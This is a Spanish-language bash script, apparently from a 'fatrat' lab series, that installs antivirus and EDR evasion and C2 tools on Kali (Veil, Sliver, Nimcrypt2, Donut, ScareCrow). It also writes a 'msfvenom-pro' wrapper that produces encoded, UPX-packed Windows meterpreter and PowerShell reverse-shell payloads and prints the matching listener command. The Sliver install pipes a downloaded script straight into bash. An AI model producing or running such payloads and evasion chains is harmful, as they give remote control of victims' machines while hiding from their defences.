#!/usr/bin/env bash
# =============================================================
# 06 - INSTALAR HERRAMIENTAS MODERNAS (Veil, Sliver, Havoc, Nim)
# Ejecutar en Kali:  sudo bash 06-alternativas-modernas.sh
# =============================================================
set -euo pipefail

[[ $EUID -eq 0 ]] || { echo "Ejecuta como root"; exit 1; }

LOG="/tmp/fatrat-lab/alternativas.log"
mkdir -p /tmp/fatrat-lab
info() { echo "[+] $*" | tee -a "$LOG"; }
done() { echo "[*] $*" | tee -a "$LOG"; }

info "=== Instalando herramientas modernas (2026) ==="

# =============================================================
# 1. Veil (Framework de evasión de AV)
# =============================================================
info "Instalando Veil..."
if command -v veil &>/dev/null; then
    info "Veil ya instalado"
else
    apt install -y veil 2>/dev/null || {
        git clone --depth=1 https://github.com/Veil-Framework/Veil.git /opt/Veil
        cd /opt/Veil && bash install.sh -c
    }
    info "Veil: OK. Ejecuta: veil"
fi

# =============================================================
# 2. Sliver (C2 moderno de BishopFox)
# =============================================================
info "Instalando Sliver C2..."
if command -v sliver-server &>/dev/null; then
    info "Sliver ya instalado"
else
    curl -sL https://sliver.sh/install | bash 2>&1 | tee -a "$LOG"
    info "Sliver: OK. Ejecuta: sliver-server"
fi

# =============================================================
# 3. Nim + NimCrypt (ofuscación avanzada)
# =============================================================
info "Instalando Nim..."
if command -v nim &>/dev/null; then
    info "Nim ya instalado"
else
    apt install -y nim 2>&1 | tee -a "$LOG"
    # NimCrypt - shellcode loader en Nim
    git clone --depth=1 https://github.com/byt3bl33d3r/Nimcrypt2.git /opt/Nimcrypt2 2>&1 | tee -a "$LOG"
    info "Nim + Nimcrypt2: OK"
fi

# =============================================================
# 4. Donut (shellcode a .NET)
# =============================================================
info "Instalando Donut..."
if command -v donut &>/dev/null; then
    info "Donut ya instalado"
else
    git clone --depth=1 https://github.com/TheWover/donut.git /opt/donut 2>&1 | tee -a "$LOG"
    cd /opt/donut && make 2>&1 | tee -a "$LOG"
    ln -sf /opt/donut/donut /usr/local/bin/donut
    info "Donut: OK. Convierte EXE/DLL a shellcode .NET"
fi

# =============================================================
# 5. ScareCrow (Evasión EDR)
# =============================================================
info "Instalando ScareCrow..."
if command -v ScareCrow &>/dev/null; then
    info "ScareCrow ya instalado"
else
    git clone --depth=1 https://github.com/optiv/ScareCrow.git /opt/ScareCrow 2>&1 | tee -a "$LOG"
    cd /opt/ScareCrow && go build 2>&1 | tee -a "$LOG"
    ln -sf /opt/ScareCrow/ScareCrow /usr/local/bin/ScareCrow
    info "ScareCrow: OK (evasión EDR con firmas)"
fi

# =============================================================
# 6. msfvenom wrapper avanzado
# =============================================================
info "Creando msfvenom-pro (super wrapper)..."
cat > /usr/local/bin/msfvenom-pro << 'SCRIPT'
#!/usr/bin/env bash
# msfvenom-pro: generacion multiple con ofuscacion en capas
set -e
usage() {
    echo "Uso: msfvenom-pro <LHOST> <LPORT> [output]"
    echo "Ej:  msfvenom-pro 192.168.1.10 4444 shell.exe"
    exit 1
}
LHOST="${1:?$(usage)}"
LPORT="${2:?$(usage)}"
OUT="${3:-payload_$(date +%s).exe}"

echo "[*] Generando payload en 3 variantes..."
echo ""

# Variante 1: shikata_ga_nai
echo "[1/3] x86/shikata_ga_nai x5"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -e x86/shikata_ga_nai -i 5 -f exe -o "/tmp/${OUT%.exe}_shikata.exe" 2>/dev/null

# Variante 2: cmd/windows/powershell reverse_tcp
echo "[2/3] powershell base64"
msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -o "/tmp/${OUT%.exe}_ps.ps1" 2>/dev/null

# Variante 3: custom encoders
echo "[3/3] multi-encoder"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -e x86/countdown -i 3 -f exe -o "/tmp/${OUT%.exe}_countdown.exe" 2>/dev/null

# Comprimir con UPX
echo "[*] Comprimiendo con UPX..."
upx -9 --ultra-brute "/tmp/${OUT%.exe}_shikata.exe" -o "/output/${OUT%.exe}_shikata_compressed.exe" 2>/dev/null || true

echo ""
echo "[*] Payloads generados:"
ls -lh /tmp/${OUT%.exe}_* /output/${OUT%.exe}_* 2>/dev/null
echo ""
echo "[*] Comando listener:"
echo "msfconsole -q -x 'use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $LPORT; exploit'"
SCRIPT
chmod +x /usr/local/bin/msfvenom-pro

# =============================================================
# RESUMEN
# =============================================================
info ""
info "=== HERRAMIENTAS INSTALADAS ==="
echo "  veil          - Framework evasion AV"
echo "  sliver-server - C2 moderno"
echo "  nim           - Lenguaje para ofuscacion"
echo "  donut         - .NET shellcode loader"
echo "  ScareCrow     - Evasion EDR"
echo "  msfvenom-pro  - Wrapper avanzado multi-payload"
echo ""
echo "  RECOMENDACION: Sliver + Veil es el stack mas potente en 2026"
echo ""
info "LOG: $LOG"
